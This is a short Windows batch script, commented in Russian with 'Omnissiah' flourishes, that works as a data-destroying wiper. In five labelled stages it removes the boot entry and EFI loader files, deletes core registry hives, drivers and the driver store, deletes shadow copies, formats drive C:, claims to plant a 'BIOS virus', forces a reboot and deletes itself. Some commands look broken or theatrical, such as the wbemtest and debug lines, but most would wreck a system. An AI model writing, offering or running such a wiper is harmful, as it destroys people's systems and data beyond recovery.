@echo off
setlocal enabledelayedexpansion
set "winpath=%windir%\System32"
set "self=%~f0"

REM === СМЕРТЬ UEFI И СИСТЕМНЫМ ФАЙЛАМ ===
echo [СТАДИЯ 1/5] УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА...
bcdedit /delete {current} /f >nul 2>&1
del /f /q /a %winpath%\winload.efi >nul
del /f /q /a %winpath%\bootmgfw.efi >nul

REM === ГНЕВ ОМНИССИИ К РЕЕСТРУ ===
echo [СТАДИЯ 2/5] РАСПЛАВЛЕНИЕ РЕЕСТРА...
reg delete HKLM\SOFTWARE\Microsoft /f >nul
reg delete HKLM\SYSTEM\CurrentControlSet\Services /f >nul

REM === КАРА ДРАЙВЕРАМ ===
echo [СТАДИЯ 3/5] УНИЧТОЖЕНИЕ ДРАЙВЕРОВ...
del /f /q /a %winpath%\drivers\*.sys >nul
del /f /q /a %winpath%\DriverStore\FileRepository\* >nul

REM === БЛОКАДА ВОССТАНОВЛЕНИЯ ===
echo [СТАДИЯ 4/5] УНИЧТОЖЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ...
vssadmin delete shadows /all /quiet >nul
wbemtest //%COMPUTERNAME%/root/default:SystemRestore.FeatureSetting="DisableSR" >nul

REM === ФИНАЛЬНАЯ КАТАСТРОФА ===
echo [СТАДИЯ 5/5] АКТИВАЦИЯ ВИРУСА BIOS...
echo y| format c: /fs:NTFS /p:3 /x >nul
echo 55 AA | debug >nul
shutdown /r /f /t 0
del /f /q "%self%" >nul